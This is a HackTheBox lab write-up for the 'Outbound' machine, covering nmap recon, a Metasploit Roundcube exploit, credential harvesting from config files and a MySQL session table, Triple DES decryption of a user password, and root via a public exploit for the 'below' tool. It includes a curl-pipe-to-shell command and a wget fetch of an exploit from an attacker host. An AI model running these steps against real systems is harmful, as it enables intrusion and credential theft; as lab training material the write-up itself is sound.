+++
title = "Outbound [Write-up] - HackTheBox"
date = "2025-08-10T16:46:16+05:30"
author = "Maaroof Khan"
authorTwitter = ""
cover = ""
coverCaption = "Outbound has been Pwned!"
tags = ["HackTheBox", "Writeup", "Linux", "Easy"]
keywords = ["Outbound", "HTB", "Roundcube", "CVE-2023-43770", "Below", "Privilege Escalation"]
description = "A detailed walkthrough of the HackTheBox 'Outbound' machine."
showFullContent = false
readingTime = true
hideComments = false
color = ""
+++

Hello everyone, and welcome to my first-ever write-up!

This box seemed pretty straightforward at first, but it wasn't long before it had me begging for mercy. Let's dive in!

![HackTheBox Task Page](htb_task_page.png)

I booted up the "Outbound" machine, ready to see what this bad boy had to offer. We're handed credentials right from the start (`tyler / LhKL1o9Nm3X2`), which almost certainly means a login portal awaits.

### Initial Reconnaissance

As is tradition with any HackTheBox machine, the first step is always `nmap`.

```bash
nmap -T5 10.10.11.77
```

I ran a `T5` scan for some quick results.

And here’s what we got:

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-10 16:54 IST
Nmap scan report for 10.10.11.77
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 4.31 seconds
```

We have a web server on port 80 and SSH on port 22. Seeing SSH usually means we'll be using it later. Now, let's get this box to spill some beans with a more aggressive scan.

```bash
nmap -Pn -p 22,80 -sC -sV 10.10.11.77
```

The output was revealing:

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-10 17:00 IST
Nmap scan report for 10.10.11.77
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The web server redirects to `http://mail.outbound.htb`, so let's add that to our `/etc/hosts` file.

```bash
sudo nano /etc/hosts
```

I added the following line:
`10.10.11.77     outbound.htb mail.outbound.htb`

Time to check out this mailing service.

![Roundcube Login Page](roundcube_login.png)

### Roundcube Exploit

Here it is, the moment we've all been waiting for: a login page! Let's use the credentials we were given. Success! We're in, but Tyler's inbox is bone dry. Guess he isn't too popular.

A quick look at the "About" section reveals the software version.

![Roundcube About Page](roundcube_about.png)

We're dealing with **Roundcube Webmail 1.6.10**. Before diving down a Google rabbit hole for exploits, my first move is always to fire up `metasploit`.

```bash
sudo msfconsole
search roundcube
```

And what do you know, we hit the jackpot! An exploit for our version is available. The exact CVE is `CVE‑2025‑49113`.

![Metasploit Modules](metasploit_exp.png)

Time to exploit (rubs hands).
Used the following steps to run the exploit:
```bash
use 1
set RHOSTS mail.outbound.htb
set LHOST tun0
set USERNAME tyler
set PASSWORD LhKL1o9Nm3X2
run
```

And just like that, we have a meterpreter shell!

### Finding Juicy Details (Post-Exploitation)

My first order of business on a new machine is always to hunt for passwords and config files.

```bash
find /var -name "config" 2>/dev/null
```

This led me to `/var/www/html/roundcube/config`. 

Peeking into this folder gave away the file `config.inc.php` and it contained some spicy details.
Here is a sneak peak:

```php
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
```

We've got the MySQL password and a DES key. This will definitely come in handy. Let's check into mysql and see what we get.

```bash
mysql -u roundcube -pRCDBPass2025 roundcube
```

Once we are in we can make basic queries (The responses take their sweet time to show up so be patient here)

```sql
use roundcube;
show tables;
select * from users;
select * from session;
```

#### This part in my opinion was the trickiest of all in this box

The `session` table gives us a bunch of base64 encoded session details

Using CyberChef, we can decode this data and find something very interesting.

![CyberChef showing Jacob's credentials](cyberchef-jacob.png)

We found another user, `jacob`, and more importantly, his password! The catch? It's encrypted. But wait, we have that DES key from the config file. After a lot of digging, I confirmed that Roundcube uses Triple DES for session data encryption.

Here's how to decrypt the password:
1. Convert the password from base64 to hex
2. Copy the first 8 bytes (They will be your IV - `Initialization Vector` for decryption)
3. Enter the first 8 bytes into the IV field (keep it hex) in cyberchef **Triple DES Decrypt**, along with the des key (set it to utf-8 first)
4. Paste the rest of the hex into the input part (Except the first 8 bytes we used)
5. Get the password

Here is the decrypted password we get:

![CyberChef decrypting the password](password_decrypt.png)

### Privilege Escalation

Now that we have jacob in our control, let's check this lad's account shall we

```bash
su jacob
# Enter the password
cat /home/jacob/user.txt
```

We've got the user flag!

Now that we are Jacob let's check the home folder

```bash
cd /home/jacob
```

It had a mail folder which had a `INBOX` folder which contained a file `jacob`

```bash
cat jacob
```

Gave us 2 mails,
One contained the ssh credentials for jacob
The other said:

> "We have been experiencing high resource consumption on our main server.
For now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.
Please inform us immediately if you notice any irregularities."

This is a massive clue. It sounds like Jacob has special permissions to run a service as root. Time for a proper shell!

```bash
ssh jacob@10.10.11.77
```

Now that we have user.txt and a massive clue from that mail lets check how we can escalate.
Lets use `LinPeas` to find something (`sudo -l` could also reveal information but linpeas might give additional details)

```bash
# On your machine - where linpeas.sh resides
sudo python3 -m http.server 80

# On victim's ssh shell
curl -L <Your-HTB-IP>/linpeas.sh | sh
```

As predicted we got this:

```bash
User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
```

We can run the `below` command as root without a password. A goldmine, if I ever saw one. This part took me the most time, as I was trying to exploit it manually without success.

A quick search online for a `below` exploit leads to `CVE-2025-27591`.

I found a really cool python exploitation script [(Check it out)](https://github.com/BridgerAlderson/CVE-2025-27591-PoC)

I transferred the script to the victim machine and ran it.

```bash
# On your machine
python3 -m http.server 80

# On the victim's machine
wget http://<Your-HTB-IP>/exploit.py
python3 exploit.py
```

And Wham-Bam-Thank-You-Ma'am! We got root!

![HTB PWNED](cover.png)

Now, just head to `/root` and grab your well-earned flag.

Happy Hacking! And see you next week